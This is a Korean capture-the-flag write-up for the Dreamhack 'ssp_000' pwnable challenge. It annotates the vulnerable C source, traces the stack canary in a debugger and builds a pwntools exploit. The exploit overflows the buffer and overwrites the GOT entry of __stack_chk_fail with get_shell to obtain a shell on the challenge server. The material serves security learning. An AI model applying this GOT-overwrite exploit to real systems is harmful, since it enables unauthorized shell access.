#GOT_Overwrite  #canary #스택버퍼오버플로우 #Stack_Smashing_Protector
### 1. 파일분석

실행권한 주기
chmod u+x ssp_000

file ./ssp_000      
./ssp_000: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=fed2bfdb258fff0b33a2083e6031b84312cf0f8d, not stripped

checksec --file=./ssp_000 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH        Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   81 Symbols          No    0               2               ./ssp_000

Canary 가 설정되어 있다.
 PIE 가 적용되지 않았기 때문에 해당 바이너리가 실행되는 메모리 주소가 랜덤화되지 않는다.
 get_shell() 함수의 주소를 그대로 사용할 수 있다.

### 2. 코드 분석 

``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

// 알람(타임아웃) 핸들러. 시간이 최과되면 프로세스 종료함.
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

/*
엽출력 버퍼링을 비활성화 - 입출력 타이밍 예측이 쉬워짐.
SIGALRM을 등록하고 이후 alarm()함수를 사용할 수 있음. 30초 후 타임아웃.
*/
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

// 쉘을 여는 함수. main에서 직접 호출되진 않지만 익스플로잇으로 실행 가능.
void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {
    // addr 와 value : 사용자로부터 임의의 주소와 값을 입력받아 그 주소에 vlaue를 쓴다.
    // buf : 64바이트
    long addr;
    long value;
    char buf[0x40] = {};

    initialize();

    // buf의 크기는 0x40인데 read로 0x80(128) 바이트를 읽는다.
    // -> 스택 버퍼 오버플로우 발생
    // 스택의 인접 데이터(리턴 주소, 프레임 포인터, 변수 등)를 덮어 쓸 수 있음.
    read(0, buf, 0x80);

    // 사용자로부터 64비트 정수형 주소와 값을 읽는다.
    printf("Addr : ");
    scanf("%ld", &addr);
    printf("Value : ");
    scanf("%ld", &value);

    /*
    addr - long형 타입의 숫자(정수) -> 우편번호
    (long *)addr - 그 숫자를 "long 포이터"롤 형변환함. -> 우편배달원이 이해하는 주소표지판으로 형변환
    *(long *)addr - 그 포인터가 가리키는 집(메모리 위치) 안을 열어본다는 뜻 -> 역참조, dereference
    *(long *)addr = value - 그 집 안에 value라는 물건(8바이트 값)을 놓아라. (대입해라.)
    */
    // 입력한 임의 주소 addr 에 vlaue를 그대로 써 버린다.(임의 쓰기 - arbitrary write)
    // 사용자 영역 내의 중요한 메모리(예: GOT, 함수포인터, 스택상의 리턴 주소 등)를 덮어쓸 수 있다면????
    *(long *)addr = value;

    return 0;
}

```

### 3. 익스플로잇 설계

1.. read() 함수에서 버퍼 오버플로우 발생.
2.. 두 번의 scanf()로 값 입력받음
3.. 처음 입력받은 addr의 주소값을 value로 덮어 쓸 수 있다.
4.. canary를 변조하게 되면 main 함수가 종료되는 시점에 __stack_chk_fail 함수가 실행되는 것을 알 수 있다.

``` d
pwndbg> disass main
Dump of assembler code for function main:
=> 0x00000000004008fb <+0>:     push   rbp
   0x00000000004008fc <+1>:     mov    rbp,rsp
   0x00000000004008ff <+4>:     sub    rsp,0x70
   0x0000000000400903 <+8>:     mov    DWORD PTR [rbp-0x64],edi
   0x0000000000400906 <+11>:    mov    QWORD PTR [rbp-0x70],rsi
   0x000000000040090a <+15>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000400913 <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400917 <+28>:    xor    eax,eax
   0x0000000000400919 <+30>:    lea    rdx,[rbp-0x50]
   0x000000000040091d <+34>:    mov    eax,0x0
   0x0000000000400922 <+39>:    mov    ecx,0x8
   0x0000000000400927 <+44>:    mov    rdi,rdx
   0x000000000040092a <+47>:    rep stos QWORD PTR es:[rdi],rax
   0x000000000040092d <+50>:    mov    eax,0x0
   0x0000000000400932 <+55>:    call   0x40088e <initialize>
   0x0000000000400937 <+60>:    lea    rax,[rbp-0x50]
   0x000000000040093b <+64>:    mov    edx,0x80
   0x0000000000400940 <+69>:    mov    rsi,rax
   0x0000000000400943 <+72>:    mov    edi,0x0
   0x0000000000400948 <+77>:    call   0x400710 <read@plt>
   0x000000000040094d <+82>:    mov    edi,0x400a55
   0x0000000000400952 <+87>:    mov    eax,0x0
   0x0000000000400957 <+92>:    call   0x4006f0 <printf@plt>
   0x000000000040095c <+97>:    lea    rax,[rbp-0x60]
   0x0000000000400960 <+101>:   mov    rsi,rax
   0x0000000000400963 <+104>:   mov    edi,0x400a5d
   0x0000000000400968 <+109>:   mov    eax,0x0
   0x000000000040096d <+114>:   call   0x400750 <__isoc99_scanf@plt>
   0x0000000000400972 <+119>:   mov    edi,0x400a61
   0x0000000000400977 <+124>:   mov    eax,0x0
   0x000000000040097c <+129>:   call   0x4006f0 <printf@plt>
   0x0000000000400981 <+134>:   lea    rax,[rbp-0x58]
   0x0000000000400985 <+138>:   mov    rsi,rax
   0x0000000000400988 <+141>:   mov    edi,0x400a5d
   0x000000000040098d <+146>:   mov    eax,0x0
   0x0000000000400992 <+151>:   call   0x400750 <__isoc99_scanf@plt>
   0x0000000000400997 <+156>:   mov    rax,QWORD PTR [rbp-0x60]
   0x000000000040099b <+160>:   mov    rdx,rax
   0x000000000040099e <+163>:   mov    rax,QWORD PTR [rbp-0x58]
   0x00000000004009a2 <+167>:   mov    QWORD PTR [rdx],rax
   0x00000000004009a5 <+170>:   mov    eax,0x0
   0x00000000004009aa <+175>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004009ae <+179>:   xor    rcx,QWORD PTR fs:0x28
   0x00000000004009b7 <+188>:   je     0x4009be <main+195>
   0x00000000004009b9 <+190>:   call   0x4006d0 <__stack_chk_fail@plt>
   0x00000000004009be <+195>:   leave
   0x00000000004009bf <+196>:   ret
End of assembler dump.
```

canary의 위치는 [rbp-0x8] 이고, buf의 위치는 [rbp-0x50] 인것을 확인!
canary 값의 위치를 확인하기 위해 read() 함수를 call 할때 브레이크를 걸고, rsi의 값을 확인해 본다.

``` d
pwndbg> b *main+77
Breakpoint 1 at 0x400948
pwndbg> r

pwndbg> info register rsi
rsi            0x7fffffffd9e0      140737488345568

pwndbg> x/40gx 0x7fffffffd9e0
0x7fffffffd9e0: 0x0000000000000000      0x0000000000000000
0x7fffffffd9f0: 0x0000000000000000      0x0000000000000000
0x7fffffffda00: 0x0000000000000000      0x0000000000000000
0x7fffffffda10: 0x0000000000000000      0x0000000000000000
0x7fffffffda20: 0x0000000000000000      0x8c6bc3760b949b00 <<<<--- canary
0x7fffffffda30: 0x0000000000000001      0x00007ffff7dd8ca8
0x7fffffffda40: 0x0000000000000000      0x00000000004008fb
0x7fffffffda50: 0x0000000100000000      0x00007fffffffdb48
0x7fffffffda60: 0x00007fffffffdb48      0x3fb2536dbfd00033
0x7fffffffda70: 0x0000000000000000      0x00007fffffffdb58
0x7fffffffda80: 0x00007ffff7ffd000      0x0000000000000000
0x7fffffffda90: 0xc04dac920b520033      0xc04dbcd6a7120033
0x7fffffffdaa0: 0x0000000000000000      0x0000000000000000
0x7fffffffdab0: 0x0000000000000000      0x0000000000000000
0x7fffffffdac0: 0x00007fffffffdb58      0x8c6bc3760b949b00
0x7fffffffdad0: 0x0000000000000000      0x00007ffff7dd8d65
0x7fffffffdae0: 0x00000000004008fb      0x00007fff00000000
0x7fffffffdaf0: 0x00007ffff7ffe310      0x0000000000000000
0x7fffffffdb00: 0x0000000000000000      0x0000000000400780
0x7fffffffdb10: 0x00007fffffffdb40      0x0000000000000000
```

buf에 80 바이트의 dummy를 넣으면 canary가 변조되는 것을 알 수 있다.

``` d
   
   0x00000000004009aa <+175>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004009ae <+179>:   xor    rcx,QWORD PTR fs:0x28
   0x00000000004009b7 <+188>:   je     0x4009be <main+195>
   0x00000000004009b9 <+190>:   call   0x4006d0 <__stack_chk_fail@plt>
   0x00000000004009be <+195>:   leave
   0x00000000004009bf <+196>:   ret
```
 main함수의 마지막 에필로그 부분을 보면 canary 변조가 되었는지 검증하는 함수가 있는 것을 알 수 있다.

canary값을 변조하여 강제로 __stack_chk_fail 함수를 실행하게 하는데, C 소스에서 addr 과 value 를 이용하여 메모리 주소 변조가 가능하다.
addr이 가리키는 포인터 주소를 value 값(주소)로 바꾸기.

여기서 value 값을 get_shell 함수의 주소를 주게되면....

``` d
pwndbg> info func get_shell
All functions matching regular expression "get_shell":

Non-debugging symbols:
0x00000000004008ea  get_shell
```


### 4. 익스플로잇
``` python
from pwn import *

# p = process("./ssp_000")
p = remote("host1.dreamhack.games", 21774)
e = ELF("./ssp_000")

p.sendline(b"A" * 80)

p.recvuntil(b"Addr : ")
p.sendline(str(e.got["__stack_chk_fail"]).encode())

p.recvuntil(b"Value : ")
p.sendline(str(e.symbols["get_shell"]).encode())

p.interactive()
```